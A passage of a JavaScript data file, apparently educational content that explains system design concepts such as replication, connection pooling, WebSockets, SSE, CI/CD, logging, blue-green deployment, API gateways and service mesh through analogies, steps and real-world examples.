            { step: "4", title: "Replicas apply changes", description: "Execute same INSERT on replicas" },
            { step: "5", title: "Read from replicas", description: "Distribute read queries across replicas" },
        ],
        misunderstanding: {
            wrong: '"Replication means instant consistency"',
            correct: "<strong>Replication has lag</strong>. Replicas are eventually consistent, not immediately. Writes to primary take milliseconds to propagate to replicas."
        },
        realWorld: {
            title: "Real-World Example",
            description: "Social media app:",
            points: [
                "1 primary database (handles all writes)",
                "5 read replicas (handle all reads)",
                "User posts photo → write to primary",
                "Users view feed → read from nearest replica",
                "If primary fails → promote replica to primary",
            ]
        }
    },

    // Connection Pooling
    'connection-pooling': {
        whatItIs: "<strong>Connection pooling</strong> is reusing database connections instead of creating new ones for each request. It dramatically improves performance by avoiding the overhead of establishing connections.",
        analogy: {
            title: "The Taxi Stand Analogy",
            items: [
                { emoji: "🚕", title: "Taxis (Connections)", subtitle: "Ready to use" },
                { emoji: "🅿️", title: "Taxi Stand (Pool)", subtitle: "Waiting area", highlighted: true },
                { emoji: "👥", title: "Passengers (Requests)", subtitle: "Need rides" },
            ],
            description: "Instead of calling a new taxi each time (slow), you go to a taxi stand where taxis wait. Use one, return it to the stand. Connection pools work the same way."
        },
        diagram: [
            { emoji: "📱", title: "Request", subtitle: "Needs DB Connection", color: "primary" },
            { emoji: "🏊", title: "Connection Pool", subtitle: "Reusable Connections", color: "secondary" },
            { emoji: "💾", title: "Database", subtitle: "Execute Query", color: "accent" },
        ],
        howItWorks: [
            { step: "1", title: "Create pool at startup", description: "Initialize 10 connections to database" },
            { step: "2", title: "Request needs connection", description: "User query arrives" },
            { step: "3", title: "Borrow from pool", description: "Get available connection (instant)" },
            { step: "4", title: "Execute query", description: "Run SELECT * FROM users" },
            { step: "5", title: "Return to pool", description: "Connection goes back for reuse" },
        ],
        misunderstanding: {
            wrong: '"More connections = better performance"',
            correct: "<strong>Too many connections hurt performance</strong>. Each connection uses memory. Optimal pool size depends on your workload, typically 10-50 connections."
        },
        realWorld: {
            title: "Real-World Example",
            description: "API server performance:",
            points: [
                "Without pooling: Create connection (50ms) + query (5ms) = 55ms per request",
                "With pooling: Borrow connection (0.1ms) + query (5ms) = 5.1ms per request",
                "Result: 10x faster! Can handle 10x more requests",
                "Pool of 20 connections handles 1000s of requests/second",
            ]
        }
    },

    // Polling vs Webhooks vs WebSockets
    'polling-webhooks-websockets': {
        whatItIs: "<strong>Polling</strong> is repeatedly asking for updates, <strong>webhooks</strong> are push notifications when events occur, and <strong>WebSockets</strong> are persistent two-way connections. Each suits different real-time needs.",
        analogy: {
            title: "The Delivery Notification Analogy",
            items: [
                { emoji: "🚪", title: "Polling (Check Door)", subtitle: "Ask every 5 min" },
                { emoji: "🔔", title: "Webhooks (Doorbell)", subtitle: "Notified when it arrives", highlighted: true },
                { emoji: "📞", title: "WebSockets (Phone Call)", subtitle: "Ongoing conversation" },
            ],
            description: "Polling: Check door every 5 minutes. Webhooks: Doorbell rings when package arrives. WebSockets: Phone call with delivery person (constant communication)."
        },
        diagram: [
            { emoji: "📱", title: "Client", subtitle: "Needs Updates", color: "primary" },
            { emoji: "🔄", title: "Communication Method", subtitle: "Poll/Webhook/WS", color: "secondary" },
            { emoji: "🖥️", title: "Server", subtitle: "Has Data", color: "accent" },
        ],
        howItWorks: [
            { step: "1", title: "Polling: Client asks repeatedly", description: "GET /api/status every 5 seconds" },
            { step: "2", title: "Webhooks: Server notifies", description: "POST to your URL when event happens" },
            { step: "3", title: "WebSockets: Persistent connection", description: "Bidirectional channel stays open" },
            { step: "4", title: "Polling: Wasteful if no changes", description: "99% of requests return 'no updates'" },
            { step: "5", title: "WebSockets: Instant updates", description: "Server pushes data immediately" },
        ],
        misunderstanding: {
            wrong: '"WebSockets are always better than polling"',
            correct: "<strong>Each has trade-offs</strong>. Polling is simple, works everywhere. Webhooks are efficient for server-to-server. WebSockets are best for real-time client apps but complex to scale."
        },
        realWorld: {
            title: "Real-World Example",
            description: "When to use each:",
            points: [
                "Polling: Check email every 5 minutes (low frequency, simple)",
                "Webhooks: Payment confirmation from Stripe (server-to-server)",
                "WebSockets: Chat app, live sports scores (real-time, bidirectional)",
                "Polling: 100 requests for 1 update. WebSockets: 1 connection, instant updates",
            ]
        }
    },

    // Server-Sent Events
    'server-sent-events': {
        whatItIs: "<strong>Server-Sent Events (SSE)</strong> is a technology that allows servers to push updates to clients over a single HTTP connection. It's simpler than WebSockets and perfect for one-way real-time updates.",
        analogy: {
            title: "The News Ticker Analogy",
            items: [
                { emoji: "📺", title: "TV Screen (Client)", subtitle: "Displays updates" },
                { emoji: "📡", title: "News Feed (SSE)", subtitle: "Continuous stream", highlighted: true },
                { emoji: "🏢", title: "News Station (Server)", subtitle: "Sends updates" },
            ],
            description: "SSE is like a news ticker on TV—the station continuously sends updates, and your TV displays them. You don't send anything back; you just receive."
        },
        diagram: [
            { emoji: "🌐", title: "Client", subtitle: "Opens Connection", color: "primary" },
            { emoji: "📡", title: "SSE Stream", subtitle: "Server Pushes Data", color: "secondary" },
            { emoji: "🖥️", title: "Server", subtitle: "Sends Events", color: "accent" },
        ],
        howItWorks: [
            { step: "1", title: "Client opens connection", description: "const eventSource = new EventSource('/api/updates')" },
            { step: "2", title: "Server keeps connection open", description: "HTTP connection stays alive" },
            { step: "3", title: "Server sends events", description: "data: {\"message\": \"New update\"}\\n\\n" },
            { step: "4", title: "Client receives events", description: "eventSource.onmessage = (event) => { ... }" },
            { step: "5", title: "Auto-reconnect on disconnect", description: "Browser automatically reconnects if connection drops" },
        ],
        misunderstanding: {
            wrong: '"SSE and WebSockets are the same"',
            correct: "<strong>SSE is simpler, one-way only</strong>. WebSockets are bidirectional but more complex. Use SSE for server-to-client updates (notifications, live feeds). Use WebSockets for chat."
        },
        realWorld: {
            title: "Real-World Example",
            description: "Live stock price updates:",
            points: [
                "Client opens SSE connection to /api/stock-prices",
                "Server pushes price updates every second",
                "Client displays live prices without polling",
                "Connection automatically reconnects if network drops",
            ]
        }
    },

    // Streaming Data
    'streaming-data': {
        whatItIs: "<strong>Streaming data</strong> is processing data continuously as it arrives, rather than waiting for the entire dataset. It enables real-time analytics and reduces latency for large data transfers.",
        analogy: {
            title: "The Water Pipe Analogy",
            items: [
                { emoji: "🚰", title: "Faucet (Data Source)", subtitle: "Continuous flow" },
                { emoji: "💧", title: "Water Stream (Data)", subtitle: "Flows continuously", highlighted: true },
                { emoji: "🥤", title: "Glass (Consumer)", subtitle: "Processes as it arrives" },
            ],
            description: "Streaming is like drinking from a faucet—you don't wait for the glass to fill completely. You start drinking as water flows. Same with data streaming."
        },
        diagram: [
            { emoji: "📊", title: "Data Source", subtitle: "Generates Data", color: "primary" },
            { emoji: "🌊", title: "Stream", subtitle: "Continuous Flow", color: "secondary" },
            { emoji: "⚙️", title: "Processor", subtitle: "Processes in Real-Time", color: "accent" },
        ],
        howItWorks: [
            { step: "1", title: "Data arrives continuously", description: "Sensor readings, user clicks, log entries" },
            { step: "2", title: "Stream processor receives", description: "Kafka, Kinesis, or custom stream handler" },
            { step: "3", title: "Process immediately", description: "Filter, transform, aggregate on the fly" },
            { step: "4", title: "Output results", description: "Send to dashboard, database, or another stream" },
            { step: "5", title: "Never wait for 'complete' dataset", description: "Process infinite streams in real-time" },
        ],
        misunderstanding: {
            wrong: '"Streaming is only for video/audio"',
            correct: "<strong>Data streaming is different from media streaming</strong>. It's about processing continuous data flows: IoT sensors, financial transactions, user events, logs, etc."
        },
        realWorld: {
            title: "Real-World Example",
            description: "Uber's real-time pricing:",
            points: [
                "Stream of ride requests and driver locations",
                "Process stream to calculate surge pricing in real-time",
                "Update prices every few seconds based on demand",
                "Can't batch process—need instant pricing decisions",
            ]
        }
    },

    // Debouncing vs Throttling
    'debouncing-throttling': {
        whatItIs: "<strong>Debouncing</strong> delays execution until after a pause in events, while <strong>throttling</strong> limits execution to once per time interval. Both optimize performance by reducing function calls.",
        analogy: {
            title: "The Elevator Analogy",
            items: [
                { emoji: "🛗", title: "Debouncing (Wait for Everyone)", subtitle: "Delay until no more people" },
                { emoji: "⏱️", title: "Throttling (Every 30 Seconds)", subtitle: "Go at fixed intervals", highlighted: true },
                { emoji: "👥", title: "People (Events)", subtitle: "Keep arriving" },
            ],
            description: "Debouncing: Elevator waits 5 seconds after last person enters. Throttling: Elevator leaves every 30 seconds regardless of how many people arrive."
        },
        diagram: [
            { emoji: "⌨️", title: "Events", subtitle: "User Input", color: "primary" },
            { emoji: "⏱️", title: "Debounce/Throttle", subtitle: "Control Execution", color: "secondary" },
            { emoji: "⚙️", title: "Function", subtitle: "Executes Optimally", color: "accent" },
        ],
        howItWorks: [
            { step: "1", title: "Debouncing: Wait for pause", description: "User types 'hello' → wait 300ms after last keystroke" },
            { step: "2", title: "Debouncing: Execute once", description: "Only call API after user stops typing" },
            { step: "3", title: "Throttling: Execute at intervals", description: "User scrolls → execute every 100ms max" },
            { step: "4", title: "Throttling: Ignore extra calls", description: "Discard calls that happen within interval" },
        ],
        misunderstanding: {
            wrong: '"Debouncing and throttling are the same"',
            correct: "<strong>Different use cases</strong>. Debouncing: Search input (wait for user to finish). Throttling: Scroll events (limit frequency). Debouncing delays, throttling limits rate."
        },
        realWorld: {
            title: "Real-World Example",
            description: "When to use each:",
            points: [
                "Debouncing: Search autocomplete (wait 300ms after typing stops)",
                "Debouncing: Window resize (recalculate layout after resizing stops)",
                "Throttling: Infinite scroll (check scroll position max every 200ms)",
                "Throttling: Mouse move tracking (update position max 60 times/second)",
            ]
        }
    },

    // CI/CD Pipelines
    'cicd-pipelines': {
        whatItIs: "<strong>CI/CD (Continuous Integration/Continuous Deployment)</strong> is automating the process of testing and deploying code. Every code change is automatically tested and deployed to production if tests pass.",
        analogy: {
            title: "The Assembly Line Analogy",
            items: [
                { emoji: "🏭", title: "Factory (CI/CD)", subtitle: "Automated process" },
                { emoji: "🔍", title: "Quality Check (Tests)", subtitle: "Verify quality", highlighted: true },
                { emoji: "🚚", title: "Shipping (Deploy)", subtitle: "Deliver to customers" },
            ],
            description: "CI/CD is like an assembly line—code goes through automated testing (quality check) and if it passes, automatically ships to customers (deployment)."
        },
        diagram: [
            { emoji: "💻", title: "Code Push", subtitle: "Git Commit", color: "primary" },
            { emoji: "🧪", title: "CI: Test", subtitle: "Run All Tests", color: "secondary" },
            { emoji: "🚀", title: "CD: Deploy", subtitle: "Ship to Production", color: "accent" },
        ],
        howItWorks: [
            { step: "1", title: "Developer pushes code", description: "git push to main branch" },
            { step: "2", title: "CI triggers", description: "GitHub Actions/Jenkins detects push" },
            { step: "3", title: "Run tests", description: "Unit tests, integration tests, linting" },
            { step: "4", title: "Build application", description: "Compile, bundle, create Docker image" },
            { step: "5", title: "Deploy if tests pass", description: "Automatically deploy to staging/production" },
        ],
        misunderstanding: {
            wrong: '"CI/CD means deploying every commit to production"',
            correct: "<strong>CD can mean Continuous Delivery OR Deployment</strong>. Delivery: Ready to deploy (manual trigger). Deployment: Auto-deploy to production. Choose based on risk tolerance."
        },
        realWorld: {
            title: "Real-World Example",
            description: "Modern development workflow:",
            points: [
                "Developer commits bug fix at 2pm",
                "CI runs 500 tests in 5 minutes → all pass",
                "CD builds Docker image and deploys to staging",
                "After manual approval, deploys to production",
                "Bug fix live in production by 2:15pm (vs days/weeks before CI/CD)",
            ]
        }
    },

    // Logging & Monitoring
    'logging-monitoring': {
        whatItIs: "<strong>Logging</strong> is recording events and errors for debugging, while <strong>monitoring</strong> is tracking system health and performance in real-time. Together they help you understand and fix issues quickly.",
        analogy: {
            title: "The Security Camera Analogy",
            items: [
                { emoji: "📹", title: "Cameras (Logging)", subtitle: "Record everything" },
                { emoji: "🖥️", title: "Live Monitor (Monitoring)", subtitle: "Watch in real-time", highlighted: true },
                { emoji: "🚨", title: "Alerts (Alarms)", subtitle: "Notify on issues" },
            ],
            description: "Logging is like security camera recordings—review what happened. Monitoring is like watching live feeds—see what's happening now. Alerts notify you of problems immediately."
        },
        diagram: [
            { emoji: "🖥️", title: "Application", subtitle: "Generates Events", color: "primary" },
            { emoji: "📝", title: "Logs", subtitle: "Record Events", color: "secondary" },
            { emoji: "📊", title: "Monitoring", subtitle: "Track Metrics", color: "accent" },
        ],
        howItWorks: [
            { step: "1", title: "Log events", description: "logger.info('User logged in'), logger.error('Payment failed')" },
            { step: "2", title: "Centralize logs", description: "Send to ELK, Datadog, CloudWatch" },
            { step: "3", title: "Track metrics", description: "Response time, error rate, CPU usage" },
            { step: "4", title: "Set up alerts", description: "Notify if error rate > 1% or response time > 500ms" },
            { step: "5", title: "Debug with logs", description: "Search logs to find root cause of issues" },
        ],
        misunderstanding: {
            wrong: '"Logging is only for debugging in development"',
            correct: "<strong>Production logging is critical</strong>. You can't debug production issues without logs. Log errors, important events, and performance metrics. Just don't log sensitive data!"
        },
        realWorld: {
            title: "Real-World Example",
            description: "Debugging a production issue:",
            points: [
                "Alert: Error rate spiked to 5% at 3am",
                "Check monitoring dashboard: Payment service is slow",
                "Search logs: 'Database connection timeout' errors",
                "Root cause: Database ran out of connections",
                "Fix: Increase connection pool size, deploy, monitor recovery",
            ]
        }
    },

    // Blue-Green Deployment
    'blue-green-deployment': {
        whatItIs: "<strong>Blue-green deployment</strong> is running two identical production environments (blue and green). You deploy to the inactive one, test it, then switch traffic over. Enables zero-downtime deployments and instant rollback.",
        analogy: {
            title: "The Stage Performance Analogy",
            items: [
                { emoji: "🎭", title: "Stage A (Blue)", subtitle: "Current show" },
                { emoji: "🎪", title: "Stage B (Green)", subtitle: "Rehearse new show", highlighted: true },
                { emoji: "👥", title: "Audience (Users)", subtitle: "Switch stages instantly" },
            ],
            description: "Blue-green is like having two stages. Audience watches Stage A while you rehearse the new show on Stage B. When ready, instantly switch audience to Stage B."
        },
        diagram: [
            { emoji: "🔵", title: "Blue (Live)", subtitle: "Serving Traffic", color: "primary" },
            { emoji: "🟢", title: "Green (Staging)", subtitle: "Deploy New Version", color: "secondary" },
            { emoji: "🔄", title: "Switch", subtitle: "Instant Cutover", color: "accent" },
        ],
        howItWorks: [
            { step: "1", title: "Blue is live", description: "All traffic goes to blue environment" },
            { step: "2", title: "Deploy to green", description: "Deploy new version to green (inactive)" },
            { step: "3", title: "Test green", description: "Run smoke tests, verify everything works" },
            { step: "4", title: "Switch traffic", description: "Load balancer routes traffic to green" },
            { step: "5", title: "Rollback if needed", description: "Switch back to blue instantly if issues arise" },
        ],
        misunderstanding: {
            wrong: '"Blue-green requires double the infrastructure cost"',
            correct: "<strong>Only during deployment</strong>. After switching, you can shut down the old environment or keep it for instant rollback. Cost is temporary, safety is permanent."
        },
        realWorld: {
            title: "Real-World Example",
            description: "Deploying a critical update:",
            points: [
                "Blue environment serves 1M users",
                "Deploy new version to green environment",
                "Test green with internal traffic",
                "Switch 100% traffic to green → zero downtime!",
                "If issues: Switch back to blue in 5 seconds",
            ]
        }
    },

    // API Gateway
    'api-gateway': {
        whatItIs: "<strong>API Gateway</strong> is a single entry point for all client requests that routes them to appropriate microservices. It handles authentication, rate limiting, caching, and request/response transformation.",
        analogy: {
            title: "The Hotel Concierge Analogy",
            items: [
                { emoji: "🏨", title: "Hotel (Your System)", subtitle: "Many services" },
                { emoji: "👔", title: "Concierge (API Gateway)", subtitle: "Single point of contact", highlighted: true },
                { emoji: "🚪", title: "Rooms (Microservices)", subtitle: "Actual services" },
            ],
            description: "API Gateway is like a hotel concierge—guests don't directly access rooms, restaurant, spa. They ask the concierge who routes requests and handles authentication."
        },
        diagram: [
            { emoji: "📱", title: "Client", subtitle: "Makes Request", color: "primary" },
            { emoji: "🚪", title: "API Gateway", subtitle: "Routes & Transforms", color: "secondary" },
            { emoji: "🔧", title: "Microservices", subtitle: "Process Request", color: "accent" },
        ],
        howItWorks: [
            { step: "1", title: "Client calls gateway", description: "GET /api/user/profile" },
            { step: "2", title: "Gateway authenticates", description: "Verify JWT token" },
            { step: "3", title: "Gateway routes", description: "Forward to User Service" },
            { step: "4", title: "Gateway aggregates", description: "Combine responses from multiple services" },
            { step: "5", title: "Gateway transforms", description: "Convert internal format to client-friendly JSON" },
        ],
        misunderstanding: {
            wrong: '"API Gateway is just a reverse proxy"',
            correct: "<strong>API Gateway does much more</strong>: authentication, rate limiting, request/response transformation, caching, monitoring, and service aggregation. Reverse proxy just forwards requests."
        },
        realWorld: {
            title: "Real-World Example",
            description: "Mobile app with microservices:",
            points: [
                "Without gateway: App calls 5 different services (complex)",
                "With gateway: App calls one endpoint /api/dashboard",
                "Gateway calls User, Orders, Recommendations, Notifications services",
                "Gateway combines responses into single JSON",
                "App gets everything in one request (simple, fast)",
            ]
        }
    },

    // Service Mesh
    'service-mesh': {
        whatItIs: "<strong>Service mesh</strong> is an infrastructure layer that handles service-to-service communication in microservices. It provides observability, security, and reliability without changing application code.",
        analogy: {
            title: "The Postal Service Analogy",
            items: [
                { emoji: "🏢", title: "Buildings (Services)", subtitle: "Send/receive mail" },
                { emoji: "📮", title: "Postal Service (Service Mesh)", subtitle: "Handles delivery", highlighted: true },
                { emoji: "✉️", title: "Letters (Requests)", subtitle: "Communication" },
            ],
            description: "Buildings don't deliver mail themselves. The postal service handles routing, tracking, and delivery. Service mesh does the same for service communication."
        },
        diagram: [
            { emoji: "🔧", title: "Service A", subtitle: "Calls Service B", color: "primary" },
            { emoji: "🕸️", title: "Service Mesh", subtitle: "Manages Communication", color: "secondary" },
            { emoji: "⚙️", title: "Service B", subtitle: "Receives Request", color: "accent" },
        ],
        howItWorks: [
            { step: "1", title: "Service A calls Service B", description: "Request goes through sidecar proxy" },
            { step: "2", title: "Mesh handles routing", description: "Load balance, retry, timeout logic" },
            { step: "3", title: "Mesh encrypts traffic", description: "Mutual TLS between services" },
            { step: "4", title: "Mesh collects metrics", description: "Track latency, errors, traffic" },
            { step: "5", title: "Mesh enforces policies", description: "Rate limiting, access control" },
        ],
        misunderstanding: {
            wrong: '"Service mesh is required for microservices"',
            correct: "<strong>Service mesh adds complexity</strong>. Only needed when you have many microservices and need advanced features like mTLS, traffic management, observability. Start simple."
        },
        realWorld: {
            title: "Real-World Example",
            description: "100 microservices with Istio:",
            points: [
                "Without mesh: Each service implements retry, timeout, metrics (duplicated code)",
                "With mesh: Istio handles all cross-cutting concerns",
                "Automatic mTLS encryption between all services",
                "Centralized traffic management and observability",
                "Deploy new service → mesh features work automatically",
            ]
        }
    },

    // Separation of Concerns
    'separation-of-concerns': {
        whatItIs: "<strong>Separation of concerns</strong> is organizing code so that each part handles one specific responsibility. It makes code easier to understand, test, and maintain by avoiding mixing unrelated logic.",
        analogy: {
            title: "The Kitchen Organization Analogy",
            items: [
                { emoji: "🔪", title: "Prep Station (Data Layer)", subtitle: "Handle ingredients" },
                { emoji: "🍳", title: "Cooking Station (Business Logic)", subtitle: "Prepare dishes", highlighted: true },
                { emoji: "🍽️", title: "Plating Station (Presentation)", subtitle: "Serve beautifully" },
            ],
            description: "Kitchens separate prep, cooking, and plating. Each station has one job. Code should work the same—separate data, logic, and presentation."
        },
        diagram: [
            { emoji: "🗄️", title: "Data Layer", subtitle: "Database Access", color: "primary" },
            { emoji: "⚙️", title: "Business Logic", subtitle: "Core Functionality", color: "secondary" },
            { emoji: "🎨", title: "Presentation", subtitle: "UI/API", color: "accent" },
        ],
        howItWorks: [
            { step: "1", title: "Identify concerns", description: "Data access, business rules, UI, validation" },
            { step: "2", title: "Create separate modules", description: "UserRepository, UserService, UserController" },
            { step: "3", title: "Define clear interfaces", description: "Each layer exposes clean API" },
            { step: "4", title: "Avoid mixing concerns", description: "Don't put SQL in UI code" },
            { step: "5", title: "Test independently", description: "Test business logic without database" },
        ],
        misunderstanding: {
            wrong: '"More layers = better separation"',
            correct: "<strong>Balance separation with simplicity</strong>. Don't over-engineer. For small apps, 3 layers (data, logic, presentation) are enough. Add layers only when needed."
        },
        realWorld: {
            title: "Real-World Example",
            description: "User registration:",
            points: [
                "Bad: All in one function (validation + DB + email + logging)",
                "Good: UserValidator, UserRepository, EmailService, Logger",
                "Each class has one job, easy to test and modify",
                "Change email provider? Only update EmailService",
                "Add logging? Inject Logger, don't modify other code",
            ]
        }
    },
};
